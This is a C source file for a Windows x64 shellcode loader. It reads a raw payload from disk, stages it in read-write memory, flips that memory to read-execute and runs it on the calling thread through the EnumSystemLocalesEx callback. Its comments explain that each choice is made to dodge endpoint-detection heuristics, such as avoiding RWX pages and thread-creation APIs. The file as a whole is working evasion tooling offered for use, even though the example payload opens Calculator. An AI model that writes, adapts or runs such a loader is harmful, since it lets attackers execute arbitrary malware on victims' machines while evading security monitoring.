/*
 * x64 shellcode loader - Iteration 1 (reviewed)
 * Technique: threadless execution via EnumSystemLocalesEx callback
 *            + RW -> RX allocation (no RWX private pages)
 *
 * Build (MSVC x64):
 *   cl /nologo /O2 /GS- loader.c
 *
 * Usage:
 *   loader.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/*
 * Callback prototype for EnumSystemLocalesEx.
 * BOOL CALLBACK LocaleEnumProcEx(LPWSTR lpLocaleString, DWORD dwFlags,
 *                                LPARAM lParam);
 * On x64 the default calling convention is the same as CALLBACK, so we can
 * cast the payload pointer directly to LOCALE_ENUMPROCEX.
 */
typedef BOOL (CALLBACK *LOCALE_ENUMPROCEX)(LPWSTR, DWORD, LPARAM);

/* Read the whole file into a heap buffer. Caller frees. */
static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;
    size_t got = 0;

    if (path == NULL || out_size == NULL) {
        return NULL;
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
        fflush(stderr);
        return NULL;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fclose(fp);
        return NULL;
    }
    sz = ftell(fp);
    if (sz <= 0) {
        fclose(fp);
        fprintf(stderr, "[-] empty or unreadable file\n");
        fflush(stderr);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        fclose(fp);
        return NULL;
    }

    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(fp);
        return NULL;
    }

    got = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);

    if (got != (size_t)sz) {
        fprintf(stderr, "[-] short read (%zu of %ld)\n", got, sz);
        fflush(stderr);
        free(buf);
        return NULL;
    }

    *out_size = (size_t)sz;
    return buf;
}

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;
    LPVOID         mem = NULL;
    DWORD          old_prot = 0;
    SIZE_T         written = 0;
    BOOL           ok = FALSE;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        fflush(stderr);
        return 1;
    }

    sc = read_file(argv[1], &sc_size);
    if (sc == NULL) {
        return 1;
    }
    printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);

    /*
     * Step 1: allocate PAGE_READWRITE (not RWX). Private RW memory is
     * extremely common (heaps, buffers) and does not trip the RWX heuristic.
     */
    mem = VirtualAlloc(NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem == NULL) {
        fprintf(stderr, "[-] VirtualAlloc(RW) failed: %lu\n", GetLastError());
        fflush(stderr);
        SecureZeroMemory(sc, sc_size);
        free(sc);
        return 1;
    }

    /* Step 2: copy payload into the RW region. */
    for (written = 0; written < sc_size; ++written) {
        ((unsigned char *)mem)[written] = sc[written];
    }
    /* Zero the on-heap copy as a small hygiene step. */
    SecureZeroMemory(sc, sc_size);
    free(sc);
    sc = NULL;

    /*
     * Step 3: flip to PAGE_EXECUTE_READ. This is the classic RW->RX pattern
     * used by legitimate JIT engines; far less suspicious than RWX.
     */
    ok = VirtualProtect(mem, sc_size, PAGE_EXECUTE_READ, &old_prot);
    if (!ok) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        fflush(stderr);
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    /*
     * Step 4: threadless execution.
     *
     * EnumSystemLocalesEx invokes the supplied callback synchronously on the
     * calling thread. No CreateThread / CreateRemoteThread / APC / context
     * manipulation is involved. The call stack at payload entry is:
     *
     *     kernel32!EnumSystemLocalesEx
     *       -> payload
     *
     * The callback prototype is:
     *     BOOL CALLBACK fn(LPWSTR, DWORD, LPARAM)
     * which matches the x64 ABI the shellcode expects (rcx, rdx, r8).
     */
    printf("[+] dispatching payload via EnumSystemLocalesEx (threadless)\n");
    fflush(stdout);

    {
        LOCALE_ENUMPROCEX cb = (LOCALE_ENUMPROCEX)mem;
        /* LOCALE_ALL = 0, reserved = 0, lParam = 0 */
        EnumSystemLocalesEx(cb, LOCALE_ALL, 0, NULL);
    }

    /*
     * If the payload returns (typical calc shellcode calls ExitProcess and
     * never comes back), we clean up here.
     */
    printf("[+] payload returned; cleaning up\n");
    fflush(stdout);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}